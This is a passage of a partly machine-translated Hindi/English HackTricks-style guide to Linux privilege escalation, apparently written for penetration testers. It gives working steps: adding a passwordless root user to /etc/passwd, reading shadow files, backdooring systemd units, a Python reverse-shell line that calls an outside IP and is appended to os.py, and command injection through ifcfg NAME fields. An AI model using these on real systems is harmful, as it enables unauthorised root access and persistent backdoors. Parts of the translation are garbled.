### SSH Interesting configuration values

- **PasswordAuthentication:** यह निर्दिष्ट करता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह निर्दिष्ट करता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, तो यह निर्दिष्ट करता है कि सर्वर खाली password स्ट्रिंग वाले अकाउंट्स में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह निर्दिष्ट करता है कि root ssh का उपयोग करके लॉग इन कर सकता है या नहीं; डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root पासवर्ड और private key दोनों से लॉगिन कर सकता है
- `without-password` or `prohibit-password`: root केवल private key से ही लॉगिन कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके और तभी लॉगिन कर सकता है जब commands विकल्प निर्दिष्ट हों
- `no` : नहीं

### AuthorizedKeysFile

यह उन फाइलों को निर्दिष्ट करता है जिनमें वे public keys होती हैं जिनका उपयोग user authentication के लिए किया जा सकता है। यह `%h` जैसे tokens रख सकता है, जिन्हें उपयोगकर्ता के home directory से प्रतिस्थापित किया जाएगा। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **उपयोगकर्ता के home से relative paths**। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको अनुमति देता है कि आप **use your local SSH keys instead of leaving keys** (without passphrases!) को अपने server पर छोड़ने की बजाय इस्तेमाल कर सकें। इसलिए, आप **jump** via ssh **to a host** कर पाएँगे और वहाँ से दूसरे **host** पर **jump to another** कर सकेंगे, **using** वह **key** जो आपके **initial host** पर स्थित है।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिलता है तो आपको इसे **संवेदनशील विवरणों** के लिए जांचना चाहिए।

### Passwd/Shadow फ़ाइलें

OS के अनुसार `/etc/passwd` और `/etc/shadow` फाइलों का नाम अलग हो सकता है या उनका कोई बैकअप मौजूद हो सकता है। इसलिए सुझाव है कि आप **सभी को ढूँढें** और **जाँचें कि क्या आप उन्हें पढ़ सकते हैं** ताकि आप देख सकें **कि क्या फ़ाइलों के अंदर hashes हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

सबसे पहले, निम्नलिखित कमांडों में से किसी एक का उपयोग करके एक password जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
फिर उपयोगकर्ता `hacker` जोड़ें और उत्पन्न पासवर्ड जोड़ें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदा: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक नकली उपयोगकर्ता जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं।\ चेतावनी: यह मशीन की वर्तमान सुरक्षा को कम कर सकता है।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स पर `/etc/passwd` का स्थान `/etc/pwd.db` और `/etc/master.passwd` है, साथ ही `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको यह जांचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर एक **tomcat** server चल रहा है और आप **modify the Tomcat service configuration file inside /etc/systemd/,** कर सकते हैं, तो आप इन लाइनों को बदल सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार जब tomcat शुरू होगा तब निष्पादित किया जाएगा।

### Check Folders

निम्न फ़ोल्डर्स में बैकअप या दिलचस्प जानकारी हो सकती हैं: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप आखिरी वाले को पढ़ न सकें, लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### ज्ञात फ़ाइलें जिनमें passwords हो सकते हैं

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) के कोड को पढ़ें, यह **कुछ संभावित फ़ाइलों की तलाश करता है जिनमें passwords हो सकते हैं**.\\
**एक और दिलचस्प टूल** जिसे आप ऐसा करने के लिए उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक open source application है जिसका उपयोग Windows, Linux & Mac पर लोकल कंप्यूटर में स्टोर कई passwords को retrieve करने के लिए किया जाता है।

### Logs

अगर आप logs पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** ढूँढ पाने में सक्षम हो सकते हैं। जितना अजीब log होगा, उतना ही अधिक दिलचस्प होगा (शायद).\\
Also, some "bad" configured (backdoored?) audit logs may allow you to **record passwords** inside audit logs as explained in this post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**लॉग पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) वास्तव में बहुत मददगार होगा।

### Shell फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फ़ाइलों की भी जाँच करनी चाहिए जिनके **name** में या **content** के अंदर शब्द "**password**" मौजूद हों, और साथ ही logs के भीतर IPs और emails या hashes regexps की भी जाँच करें।\
मैं यहाँ यह सब कैसे करना है की सूची नहीं दे रहा हूँ लेकिन अगर आप इच्छुक हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) कौन-कौन से अंतिम चेक्स करता है।

## लिखने योग्य फाइलें

### Python library hijacking

यदि आप जानते हैं कि कोई python script **कहाँ से** execute होने वाली है और आप उस फ़ोल्डर के अंदर **लिख** सकते हैं या आप **python libraries को modify** कर सकते हैं, तो आप OS library को modify करके उसे backdoor कर सकते हैं (यदि आप उस जगह लिख सकते हैं जहाँ python script execute होने वाली है, तो os.py library को copy और paste कर दें)।

To **backdoor the library** बस os.py library के अंत में निम्नलिखित लाइन जोड़ दें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate का शोषण

`logrotate` में एक कमजोरी उन उपयोगकर्ताओं को जो लॉग फ़ाइल या उसके पैरेंट डायरेक्टरीज़ पर **write permissions** रखते हैं, संभावित रूप से escalated privileges दिला सकती है। ऐसा इसलिए है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चलता है, को arbitrary फ़ाइलें execute करने के लिए मैनिपुलेट किया जा सकता है, खासकर ऐसी डायरेक्टरीज़ में जैसे _**/etc/bash_completion.d/**_. यह ज़रूरी है कि आप permissions सिर्फ़ _/var/log_ में ही नहीं बल्कि किसी भी डायरेक्टरी में चेक करें जहां log rotation लागू होती है।

> [!TIP]
> यह सुरक्षा दोष `logrotate` संस्करण `3.18.0` और उससे पुराने को प्रभावित करता है

वulnerability के बारे में और विस्तृत जानकारी इस पृष्ठ पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस vulnerability का शोषण [**logrotten**](https://github.com/whotwagner/logrotten) के साथ कर सकते हैं।

यह सुरक्षा दोष [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) (nginx logs) के बहुत समान है, इसलिए जब भी आप पाते हैं कि आप लॉग्स में परिवर्तन कर सकते हैं, यह जांचें कि कौन उन लॉग्स का प्रबंधन कर रहा है और देखें कि क्या आप लॉग्स को symlinks द्वारा बदलकर privileges बढ़ा सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि, किसी भी कारण से, कोई उपयोगकर्ता _/etc/sysconfig/network-scripts_ में `ifcf-<whatever>` स्क्रिप्ट **write** करने में सक्षम है **या** वह किसी मौजूदा स्क्रिप्ट को **adjust** कर सकता है, तो आपका **system is pwned**।

Network scripts, _ifcg-eth0_ उदाहरण के लिए network connections के लिए उपयोग किए जाते हैं। वे बिल्कुल .INI files की तरह दिखते हैं। हालांकि, Linux पर Network Manager (dispatcher.d) द्वारा उन्हें \~sourced\~ किया जाता है।

मेरे मामले में, इन नेटवर्क स्क्रिप्ट्स में `NAME=` attribute ठीक से हैंडल नहीं होता। यदि नाम में **white/blank space in the name the system tries to execute the part after the white/blank space** होता है तो सिस्टम white/blank space के बाद के हिस्से को execute करने की कोशिश करता है। इसका मतलब यह है कि **everything after the first blank space is executed as root**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network और /bin/id के बीच रिक्त स्थान पर ध्यान दें_)

### **init, init.d, systemd, और rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** की जगह है, जो **क्लासिक Linux सेवा प्रबंधन प्रणाली** है। इसमें सेवाओं को `start`, `stop`, `restart`,` और कभी-कभी `reload` करने वाले scripts शामिल होते हैं। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से। Redhat सिस्टम्स में वैकल्पिक पथ `/etc/rc.d/init.d` है।

वहीं, `/etc/init` का संबंध **Upstart** से है, जो Ubuntu द्वारा पेश की गई एक नई सेवा प्रबंधन प्रणाली है और सेवा प्रबंधन कार्यों के लिए configuration files का उपयोग करती है। Upstart में transition के बावजूद, compatibility layer के कारण SysVinit scripts अभी भी Upstart configurations के साथ उपयोग में रहती हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत फीचर्स प्रदान करता है। यह फाइलों को `/usr/lib/systemd/` (distribution packages के लिए) और `/etc/systemd/system/` (administrator modifications के लिए) में व्यवस्थित करता है, जिससे system administration प्रक्रिया सरल हो जाती है।

## अन्य ट्रिक्स

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आम तौर पर privileged kernel functionality को userspace manager को एक्सपोज़ करने के लिए किसी syscall को hook करते हैं। कमजोर manager authentication (जैसे FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager के रूप में impersonate करने और पहले से-rooted devices पर root तक escalate करने में सक्षम बना सकती है। और अधिक जानकारी व exploitation विवरण यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
